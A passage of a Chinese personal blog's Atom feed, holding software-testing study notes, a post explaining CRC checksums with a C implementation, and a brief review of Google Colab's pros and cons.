href="https://wiki.mbalib.com/wiki/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95">黑盒</a></p></blockquote></li><li>黑盒测试：<ul><li>方法：等价类划分法、边界值分析法、因果图分析法、错误推断法，场景法。</li><li>优点：独立性、用户视角、提早发现问题。</li><li>缺点：不可见内部性、缺乏结构性反馈</li></ul></li><li>白盒测试：<ul><li>方法：分为两大类：静态测试方法和动态测试方法。<ul><li>静态：代码审查法、静态结构分析法</li><li>动态：逻辑覆盖法、基本路径测试法</li></ul></li><li>优点：内部可见性、全面覆盖性、性能和安全性检查</li><li>缺点：需要专业知识、依赖源码</li></ul></li></ul></li><li><p>软件测试的复杂性：</p><ul><li>主要体现在：<ul><li>不可能对程序实现完全测试</li><li>杀虫剂现象，必须不断尝试新的杀虫剂（写新的测试程序）</li><li>代价会随着测试量的增加程指数增长</li><li>风险的合理取舍，并不是所有故障都需要被修复</li></ul></li></ul></li><li><p>单元测试的目标：确保每个单元都能独立地正常工作，从而提高整个程序的质量、可靠性和可维护性</p></li><li><p>系统测试的流程：</p><ul><li>需求分析 -&gt; 测试计划 -&gt; 测试用例 -&gt; 测试执行 -&gt; 测试文档</li></ul></li><li><p>测试环境要素有哪些：</p><ul><li>软件、硬件、网络、数据准备、测试工具</li></ul></li></ul><h3 id="名词解析"><a href="#名词解析" class="headerlink" title="名词解析"></a>名词解析</h3><ul><li>测试环境：为了完成软件测试工作所必需的计算机硬件、软件、网络设备、历史数据的总称</li><li>备份：为应付文件、数据丢失或损坏等可能出现的意外情况，将电子计算机存储设备中的数据复制到磁带等大容量存储设备中。</li><li>恢复：使变成原来的样子，在计算机中指被删除的数据得到复原。</li><li>硬件环境：指计算机系统中的硬件设备，如CPU、内存、硬盘等</li><li>网络环境：网络环境是指将分布在不同地点的多个多媒体计算机物理上互联，依据某种协议互相通信，实现软、硬件及其网络文化共享的系统。</li><li>软件环境：运行于计算机硬件之上的驱动计算机及其外围设备实现某种目的的软件系统</li><li>面向对象：面向对象编程将一个系统抽象为许多对象的集合，每一个对象代表了这个系统的特定方面。对象包括函数（方法）和数据。</li><li>消息：消息（message）是指在程序中传递的信息或指令。 它可以是用于传递数据的信息，也可以是用于触发特定操作的指令。 消息通常用于实现程序之间的通信和交互。 在面向对象编程中，对象之间通过消息进行通信。 </li><li>封装性：封装，即隐藏对象的属性和实现细节，仅对外公开接口，控制在程序中属性的读和修改的访问级别；将抽象得到的数据和行为（或功能）相结合，形成一个有机的整体，也就是将数据与操作数据的源代码进行有机的结合，形成“类”，其中数据和函数都是类的成员。</li><li>继承性：继承就是子类继承父类的特征和行为，使得子类对象（实例）具有父类的实例域和方法，或子类从父类继承方法，使得子类具有父类相同的行为。</li><li>多态性：它是指在父类中定义的属性和方法被子类继承之后，可以具有不同的数据类型或表现出不同的行为，这使得同一个属性或方法在父类及其各个子类中具有不同的含义。</li><li>类测试：用来对类中的方法功能进行有目的的测试，以保证程序的正确性和稳定性。</li></ul><h3 id="问答"><a href="#问答" class="headerlink" title="问答"></a>问答</h3><ul><li><p>概述测试用例的设计过程：</p><ul><li>步骤为：测试需求分析 -&gt; 业务流程分析 -&gt; 测试用例设计 -&gt; 测试用例评审 -&gt; 测试用例更新完善</li></ul></li><li><p>测试文档的内容：</p><ul><li>1、测试范围（功能模块等）；2、测试类型（功能、性能、安全等）；3、测试资源（硬件、软件、人员等）；4、人员、进度安排。</li></ul></li><li><p>软件生命周期各阶段的测试任务与可交付的文档：</p><ul><li>问题定义（问题定义报告）、可行性研究（可行性分析报告，粗略的开发计划）、需求分析（需求规格说明书）、总体设计（总体设计说明书）、详细设计（详细设计说明书）、编码与单元测试（程序清单、单元测试报告）、综合测试（测试报告）、维护（）</li></ul></li><li><p>自动化测试的步骤、自动化测试工具的使用：</p><ul><li>暂略</li></ul></li><li><p>面向对象测试与传统测试有哪些区别与联系：</p><ul><li>面向对象测试更加关注对象的行为和交互，而传统测试更加关注系统的功能和流程。</li><li>都需要进行测试计划和测试用例的编写，都需要测试执行和测试结果分析，都是为了保障软件的质量和功能的正确性可靠性。</li></ul></li><li><p>面向对象测试的步骤：</p><ul><li>步骤：为类创建一个实例，即对象，为构造函数传递合适的参数 -&gt; 通过参数传递调用对象的方法并获取结果 -&gt; 检查对象的内部数据</li></ul></li><li><p>压力测试作用：确定在交通繁忙的情况下网站或应用程序的稳定性和可靠性。向访问者显示相应的错误消息和其他信息。优化系统以防止故障。正确规划可伸缩性和资源需求。</p></li><li><p>兼容性测试是什么：兼容性测试在软件测试中是一种非功能性测试方法，确保应用程序在不同硬件、操作系统、网络环境和其他软件应用的组合上正常运行。</p></li><li><p>软件工程V模型流程包括哪些步骤：客户需求分析、软件需求分析、概要设计、详细设计、编码与实现、单元测试、集成测试、系统测试、验收测试。</p></li><li><p>测试用例设计的主要影响因素：需求目标、实际使用场景、软件功能规格说明书、产品设计文档</p></li><li><p>工程使用决策表有哪4部分组成：桩部分、条目部分、条件部分、行动部分</p></li><li><p>在错误推测法中，根据什么因素进行判断好测试用例：</p><ul><li>客观因素：产品先前版本的问题</li><li>已知因素：语言、操作系统、浏览器的限制可能带来的兼容性等问题</li><li>经验：利用不同测试阶段的经验和对测试软件的需求理解以及设计实现的细节来整理归纳的测试点</li></ul></li><li><p>给出流程图G，设计环形复杂度V（G），三种常用计算机方法</p><ul><li><blockquote><p><a href="https://blog.csdn.net/qq_39183034/article/details/122460548">环路复杂度</a></p></blockquote></li><li>V(G) &#x3D; 区域数</li><li>V(G) &#x3D; P + 1，判定结点数 + 1</li><li>V(G) &#x3D; E - N + 2，边的条数 - 结点数 +2</li></ul></li><li><p>测试总结报告包括哪些内容：测试目的、重要项说明、系统概述、测试环境、差异测试项与设计说明之间的差别、测试充分性评价、质量评估、结果概述、测试结论。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;软件测试基础学习&quot;&gt;&lt;a href=&quot;#软件测试基础学习&quot; class=&quot;headerlink&quot; title=&quot;软件测试基础学习&quot;&gt;&lt;/a&gt;软件测试基础学习&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;什么是静态测试：静态测试是指不运行被测试的软件系统，而是采用其他手段和技术</summary>
      
    
    
    
    <category term="笔记" scheme="http://wu1015.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="软件测试" scheme="http://wu1015.github.io/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CRC校验的C语言实现</title>
    <link href="http://wu1015.github.io/2024/06/27/CRCLearningByC/"/>
    <id>http://wu1015.github.io/2024/06/27/CRCLearningByC/</id>
    <published>2024-06-27T11:40:26.000Z</published>
    <updated>2024-12-23T02:19:55.230Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CRC校验"><a href="#CRC校验" class="headerlink" title="CRC校验"></a>CRC校验</h2><ul><li>循环冗余校验（英语：Cyclic redundancy check，通称“CRC”）是一种根据网络数据包或电脑文件等数据产生简短固定位数校验码的一种散列函数，主要用来检测或校验数据传输或者保存后可能出现的错误。生成的数字在传输或者存储之前计算出来并且附加到数据后面，然后接收方进行检验确定数据是否发生变化。由于本函数易于用二进制的电脑硬件使用、容易进行数学分析并且尤其善于检测传输通道干扰引起的错误，因此获得广泛应用。此方法是由W. Wesley Peterson于1961年发表。</li></ul><h3 id="多项式G-x"><a href="#多项式G-x" class="headerlink" title="多项式G(x)"></a>多项式<code>G(x)</code></h3><ul><li><p>多项式为双方共同约定使用，常见的多项式有：</p><ul><li>CRC-4 &#x3D;&gt; x<sup>4</sup>+x<sup>1</sup>+x<sup>0</sup> &#x3D;&gt; 10011</li><li>CRC-8 &#x3D;&gt; x<sup>8</sup>+x<sup>5</sup>+x<sup>4</sup>+x<sup>0</sup> &#x3D;&gt; 100110001 等。</li></ul></li><li><p>因为多项式第一项必为 1，因此简记一般除去第一位后进行 16 进制计算。以上两种多项式的简记分别为0x03和0x31。</p></li></ul><h3 id="计算步骤"><a href="#计算步骤" class="headerlink" title="计算步骤"></a>计算步骤</h3><ul><li><p>首先是接收数据和多项式。</p></li><li><p>然后对数据进行处理，假定计算后的 Remainder 为0，对数据补 0。</p></li><li><p>使用模 2 除法计算 Remainder。模 2 除法例子如下。<br><img src="https://wu1015-images.pages.dev/imgs/CRCLearningByC/%E6%88%AA%E5%9B%BE_2024-06-27_22-19-33.png" alt="模 2 除法的例子"></p></li><li><p>将计算好的 Remainder 与原 data 结合后再进行模 2 除法计算。</p></li><li><p>如果得出为 0，则数据无误，否则有错误。</p></li></ul><h2 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">// CRC算法的C语言实现</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">// 获取字符数组长度</span><br><span class="line">int len(char x[])&#123;</span><br><span class="line">    int i=0;</span><br><span class="line">    while(x[i]!=&#x27;\0&#x27;)&#123;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    return i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 补全data</span><br><span class="line">void dataSet(char data[], int len_poly, char remainder[])&#123;</span><br><span class="line">    int i, len_data;</span><br><span class="line">    len_data=len(data);</span><br><span class="line">    if(remainder[0]==&#x27;\0&#x27;)&#123;</span><br><span class="line">        for(i=len_data; i&lt;len_data+len_poly-1; i++)&#123;</span><br><span class="line">            data[i]=&#x27;0&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        for(i=len_data-len_poly+1; i&lt;len_data+1; i++)&#123;</span><br><span class="line">            data[i]=remainder[i-len_data+len_poly-1];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// remainder计算</span><br><span class="line">void crc(char data[], char poly[], char remainder[], int len_data, int len_poly)&#123;</span><br><span class="line">    char tmp[100]=&#123;&#x27;\0&#x27;&#125;;</span><br><span class="line">    int i,j;</span><br><span class="line">    // 因为传参数组会对原数据进行修改（相当于传址）</span><br><span class="line">    for(i=0;i&lt;len_data;i++)&#123;</span><br><span class="line">        tmp[i]=data[i];</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;len_data-len_poly;i++)&#123;</span><br><span class="line">        if(tmp[i]!=&#x27;0&#x27;)&#123;</span><br><span class="line">            for(j=i;j&lt;i+len_poly;j++)&#123;</span><br><span class="line">                tmp[j]=(tmp[j]-48) ^ (poly[j-i]-48)+48;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(tmp[i+1]!=&#x27;0&#x27;)&#123;</span><br><span class="line">           for(j=i+1;j&lt;i+1+len_poly;j++) &#123;</span><br><span class="line">                tmp[j]=(tmp[j]-48) ^ (poly[j-1-i]-48)+48;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    for(i=0;i&lt;len_poly;i++)&#123;</span><br><span class="line">        remainder[i]=tmp[len_data-len_poly+1+i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 测试CRC</span><br><span class="line">void crcTest(char remainder[])&#123;</span><br><span class="line">    int i;</span><br><span class="line">    for(i=0;i&lt;len(remainder);i++)&#123;</span><br><span class="line">        if(remainder[i]!=&#x27;0&#x27;)&#123;</span><br><span class="line">            printf(&quot;False\n&quot;);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;True\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    char data[100]=&#123;&#x27;0&#x27;&#125;;</span><br><span class="line">    char polynomial[10]=&#123;&#x27;\0&#x27;&#125;;</span><br><span class="line">    char remainder[10]=&#123;&#x27;\0&#x27;&#125;;</span><br><span class="line">    scanf(&quot;%s&quot;,data);   //11010011101100</span><br><span class="line">    scanf(&quot;%s&quot;,polynomial); // 10011</span><br><span class="line">    printf(&quot;%d %d\n&quot;,len(data),len(polynomial));</span><br><span class="line">    printf(&quot;Data is %s\n&quot;,data);</span><br><span class="line"></span><br><span class="line">    dataSet(data,len(polynomial),remainder);</span><br><span class="line">    crc(data, polynomial, remainder, len(data),len(polynomial));</span><br><span class="line">    printf(&quot;Remainder is %s\n&quot;,remainder);  //1011</span><br><span class="line"></span><br><span class="line">    dataSet(data,len(polynomial),remainder);</span><br><span class="line">    printf(&quot;CRC is %s\n&quot;,data); //110100111011001011</span><br><span class="line">    crc(data, polynomial, remainder, len(data),len(polynomial));</span><br><span class="line">    crcTest(remainder); //True</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">循环冗余校验 wiki</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CRC校验&quot;&gt;&lt;a href=&quot;#CRC校验&quot; class=&quot;headerlink&quot; title=&quot;CRC校验&quot;&gt;&lt;/a&gt;CRC校验&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;循环冗余校验（英语：Cyclic redundancy check，通称“CRC”）是一种根据网络数据包</summary>
      
    
    
    
    <category term="笔记" scheme="http://wu1015.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="C语言" scheme="http://wu1015.github.io/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>Colab的简单使用</title>
    <link href="http://wu1015.github.io/2024/06/03/ColabUsage/"/>
    <id>http://wu1015.github.io/2024/06/03/ColabUsage/</id>
    <published>2024-06-03T12:34:34.000Z</published>
    <updated>2024-12-23T02:17:51.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><ul><li><p>Colab，免费用户可使用 T4 GPU 和 CPU。T4 虽然不说有多强吧，但至少能比用 CPU 跑强不少。不仅如此，因为不是在本地，所以一些库的安装也是飞快的（毕竟在国内不换源的话，下载速度确实不太行），而且最关键的是不占用本地空间。</p></li><li><p>建议把文件存储的 google drive 以便调用，不然存在 Colab 下线就会被清除。咱这网络环境大伙都知道，传个大点的文件本来就不容易，更何况 Colab 还没有断点续传。所以也就更建议使用 google drive 传输文件，毕竟到时候用的话只需要授权一下而已。</p></li><li><p>与国内的 AI 计算平台相比，Colab 没广告，没那种莫名其妙突然恶心你一下的东西。</p></li></ul><h2 id="劣势"><a href="#劣势" class="headerlink" title="劣势"></a>劣势</h2><ul><li><p>跑的时候需要一直在活动窗口，人话说就是得一直有人在移动窗口表示我还在线，否则直接中断连接（免费用户）。另外跑的计算量也有限，跑一些小的东西还行，跑大的东西过一些一天的额度就没了。没错，这个是有每日额度的，具体多少不知道，但是是以计算单位来算的。</p></li><li><p>不登录好像就不给看，这点确实不太好，毕竟国内的有些平台是给浏览的。</p></li></ul><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul><li>虽然 Colab 基本啥库都有，但不免会出现意外。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!pip install 模块名称</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;优势&quot;&gt;&lt;a href=&quot;#优势&quot; class=&quot;headerlink&quot; title=&quot;优势&quot;&gt;&lt;/a&gt;优势&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Colab，免费用户可使用 T4 GPU 和 CPU。T4 虽然不说有多强吧，但至少能比用 CPU 跑强不少。不仅如此，因</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="人工智能" scheme="http://wu1015.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"/>
    
  </entry>
  
</feed>
